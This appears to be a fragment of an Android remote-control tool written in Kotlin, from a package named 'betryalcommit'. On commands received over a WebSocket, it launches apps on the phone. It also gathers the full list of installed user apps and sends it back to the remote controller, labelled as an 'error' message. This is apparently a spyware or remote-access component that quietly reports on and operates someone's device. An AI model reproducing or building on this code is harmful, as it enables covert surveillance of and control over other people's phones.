package com.example.betryalcommit

import android.app.ActivityManager
import android.content.Context
import android.content.Intent
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.content.pm.ResolveInfo
import android.net.Uri
import android.os.Build
import android.os.Process
import android.system.Os
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import okhttp3.WebSocket
import org.json.JSONObject

class packagefun(private val context: Context ,private val webSocket: WebSocket ) {
     fun launchApp(packageName: String ) {
        val targetPackageName = packageName
        val packageManager = context.getPackageManager()
         val intent = packageManager.getLaunchIntentForPackage(targetPackageName)
         if (intent != null) {
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
             context.startActivity(intent)
         }else
            {
                val json = JSONObject()
                json.put("type", "error")
                json.put("data", "App not found")
                webSocket.send(json.toString())
            }

    }

    fun Gameterminator(packageName: String ) {
        val packageManager = context.packageManager
        val settingsIntent = packageManager.getLaunchIntentForPackage(packageName)
        settingsIntent?.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        context.startActivity(settingsIntent)
    }
    fun applog(webSocket: WebSocket): List<String> {
        val packages = mutableListOf<String>("all apps: \n\n");
        val pm = context.packageManager
        val installedApps = pm.getInstalledPackages(PackageManager.GET_META_DATA)
        for (packageInfo in installedApps) {
            if ((packageInfo.applicationInfo.flags and ApplicationInfo.FLAG_SYSTEM) == 0) {
                packages += packageInfo.packageName + " " + packageInfo.applicationInfo.loadLabel(pm)
                    .toString() + "\n\n"
            }
        }

        val json = JSONObject()
        json.put("type", "error")
        json.put("data", packages)
        webSocket.send(json.toString())
        return packages
    }

}


